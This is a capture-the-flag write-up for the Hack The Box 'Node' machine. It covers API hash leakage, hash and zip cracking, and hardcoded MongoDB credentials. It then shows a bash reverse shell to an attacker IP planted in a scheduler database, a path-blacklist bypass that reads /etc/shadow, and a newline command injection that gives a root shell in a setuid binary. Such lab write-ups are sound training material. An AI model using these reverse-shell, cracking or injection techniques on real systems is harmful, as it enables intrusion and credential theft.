# Node

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.85.176
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 08:12 EDT
Nmap scan report for 10.129.85.176
Host is up (0.022s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

### API Credentials

This was a default website:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

There was nothing inherently interesting about the site, and I didn't have any good credentials. However, based on the box name, I knew we had to exploit some type of JS framework here. When we take a look at the requests sent in Burp, we can see this is an Express website.

```
HTTP/1.1 304 Not Modified
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 02 Sep 2017 11:27:58 GMT
ETag: W/"f15-15e4258ef70"
Date: Thu, 04 May 2023 12:15:17 GMT
Connection: close
```

I took a look at the page source, and found that the controllers were left there.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

If we take a look at the `admin.js` file, we can find an `/api` backend.&#x20;

```javascript
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

I ran a `feroxbuster` scan on the `/api` endpoint.&#x20;

```
$ feroxbuster -u http://10.129.85.176:3000/api

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.85.176:3000/api
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET       90l      249w     3861c Got 200 for http://10.129.85.176:3000/api/6c8a5653a7b84675aca69cfa5498840d (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 3861 responses; toggle this behavior by using --dont-filter
WLD      GET       90l      249w     3861c Got 200 for http://10.129.85.176:3000/api/c460848cda4c435c891b8723024aaaa70f4651c6df85462c902c3279cb8a313efa054f197e444c1fa3db1e0ac819bcc3 (url length: 96)
200      GET        1l        1w      611c http://10.129.85.176:3000/api/users
200      GET        1l        1w      611c http://10.129.85.176:3000/api/Users
```

Here, we can find a `/users` endpoint. When viewed, it seems to contain usernames and hashes.&#x20;

```
$ curl http://10.129.85.176:3000/api/users | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   611  100   611    0     0  14374      0 --:--:-- --:--:-- --:--:-- 14547
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

The administrator can be cracked on CrackStation:

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

### Backup

When we login, all we see is this:

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

We can download the backup files and view it to find that it's a base64 encoded file. When decoded, it gives a Zip file.

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

It's password protected, so we can use `zip2john` and `john` to crack it:

```bash
$ zip2john backups > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (backups)     
1g 0:00:00:00 DONE (2023-05-04 08:22) 50.00g/s 9420Kp/s 9420Kc/s 9420KC/s sandriux..beckyg
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can unzip it and view the contents, and it appears to contain the source code for the website. Within `app.js`, we can find 2 things: the credentials for `mark` and an ASCII masterpiece.&#x20;

```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ',
'QQQQQQQQQQQQQP\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ',
'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',
'QQQQQQQQQQW\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',
'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',
'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',
'QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ',
'QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQQQQ',
'QQQP\'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',
'QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ',
'QW jQkQ@ jWQQD\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ',
'QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ',
'QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ',
'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\'<mWWWWWQW?^  ` ]6QQ\' yQQQQQ',
'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ',
'QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',
'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',
'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',
'QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',
'QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',
'QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',
'QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',
'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',
'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',
'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',
'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',
'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',
'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ',
'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',
'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',
```

Anyways, we can `ssh` in as `mark` using those credentials, but no user flag yet.

## Privilege Escalation

### To Tom

Within the machine, there are 3 users:

```
mark@node:/home$ ls
frank  mark  tom
```

`tom` has the user flag within his directory, so that's the next step. I ran `pspy64` on the machine to enumerate possible processes executed by `tom`.&#x20;

```
2023/05/04 13:30:57 CMD: UID=1000 PID=1294   | /usr/bin/node /var/scheduler/app.js 
2023/05/04 13:30:57 CMD: UID=0    PID=1292   | /usr/sbin/sshd -D 
2023/05/04 13:30:57 CMD: UID=1000 PID=1290   | /usr/bin/node /var/www/myplace/app.js 
```

It appears there's another `app.js` file here. Here are the contents:

```javascript
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);
});
```

This would use `mark` to login to the Mongo DB instance on port 27017, and then execute commands tha are present in the database via `child_process` exec. So we just need to append a reverse shell to the DB.&#x20;

We can login using `mongo`.

```
mark@node:/tmp$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> 
```

Then, we just need to insert a new task in JSON format.&#x20;

```
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'"})
WriteResult({ "nInserted" : 1 })
```

After a little bit, we should get a reverse shell on our machine as `tom`.&#x20;

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Then we can grab the user flag.

### Backup Binary

Earlier, we saw that `tom` was part of the `sudo` group. We just have to find his credentials for an easy root. First, I ran LinPEAS to enumerate the file system for me. Within the Backup Files portion, I found this:

```
-rwsr-xr-- 1 root   admin       17K Sep  3  2017 /usr/local/bin/backup
```

When examined, it appears this is an ELF file:

{% code overflow="wrap" %}
```
tom@node:/tmp$ file /usr/local/bin/backup
/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
```
{% endcode %}

This thing also takes in user input, and doesn't function without it:

```
tom@node:~$ backup 1 2 3



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!
```

I transferred this back to my machine and took a look at it using `ltrace` and `strace`.

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

It seems that it first checks whether `-q` is entered, so that must be the first argument. This was also using `strcmp`, which was obviously vulnerable to BOF. A quick `checksec` reveals this has NX enabled:

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Before going the BOF route, let's take a look at what the binary needs to backup properly. At the bottom of `ltrace` output, it seems to take keys from somewhere.

```
strncpy(0xffeef3d8, "a", 100)                            = 0xffeef3d8
strcpy(0xffeef3c1, "/")                                  = 0xffeef3c1
strcpy(0xffeef3cd, "/")                                  = 0xffeef3cd
strcpy(0xffeef357, "/e")                                 = 0xffeef357
strcat("/e", "tc")                                       = "/etc"
strcat("/etc", "/m")                                     = "/etc/m"
strcat("/etc/m", "yp")                                   = "/etc/myp"
strcat("/etc/myp", "la")                                 = "/etc/mypla"
strcat("/etc/mypla", "ce")                               = "/etc/myplace"
strcat("/etc/myplace", "/k")                             = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                           = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                          = "/etc/myplace/keys"
```

We can read these keys on the machine:

```
mark@node:/home/tom$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

I can try each token, and find that one works as there's a different error:

```
$ ./backup_binary -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d47 a a
[!] Could not open file
```

The last argument would have to be the file we want to 'backup'.&#x20;

So there's 3 methods of exploiting this so far:

* Either BOF and get a root shell
* Reading root flag and `/etc/shadow` and (hopefully) find a password.
* Possibly command injection

### Shadow Fail

I chose the second becuase it's easier. In this case, I chose to backup the `/etc/shadow` file by doing this, and found that it didn't work.

```
backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d47 /etc/shadow > backup.shadow
```

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

I took a look at the `ltrace` output again and found out why it woudln't work. It seems that some directories are blacklisted when I tried to backup the user's directory:

```
strstr("/home/tom", "..")                        = nil                                       
strstr("/home/tom", "/root")                     = nil                                       
strchr("/home/tom", ';')                         = nil                                       
strchr("/home/tom", '&')                         = nil                                       
strchr("/home/tom", '`')                         = nil                                       
strchr("/home/tom", '$')                         = nil                                       
strchr("/home/tom", '|')                         = nil                                       
strstr("/home/tom", "//")                        = nil                                       
strcmp("/home/tom", "/")                         = 1                                         
strstr("/home/tom", "/etc")                      = nil                                       
strcpy(0xffcfcd7b, "/home/tom")                  = 0xffcfcd7b
```

Notice how this checks for **absolute directories**. This means that I can bypass this check by going to `/etc` and then using `shadow` as the file I want to backup. We can repeat the command again, and find that it works!

```
2b7c740afc3d98a8d0230167104d474 shadow > /dev/shm/shadow.back                               
tom@node:/etc$ ls -la /dev/shm/shadow.back                                                   
-rw-r--r-- 1 tom tom 880 May  4 14:05 /dev/shm/shadow.back
```

We can then transfer it over using `nc` and then decode it in the same manner, with the same password protected zip.&#x20;

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

However, this hash cannot be cracked...

### Command Injection

I still didn't want to do BOF, so let's take a look at the code within `main` using `ghidra`. There's a possible point of injection here:

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Notice how the newline character is **not blacklisted**. Meaning we can use it to bypass this command **and then inject our command**. This can be done by using a **bash variable** to bypass this check since `{}` is not blacklisted as well. This would allow us to execute commands without `;`.&#x20;

{% code overflow="wrap" %}
```
newline=$'\n'
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "bla${newline}/bin/bash${newline}bla"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

This not my work, but rather from here:

{% embed url="https://ranakhalil101.medium.com/hack-the-box-node-writeup-w-o-metasploit-3dfb48ee4a9" %}

I really didn't want to go the BOF way (because there are always easier wasy).&#x20;
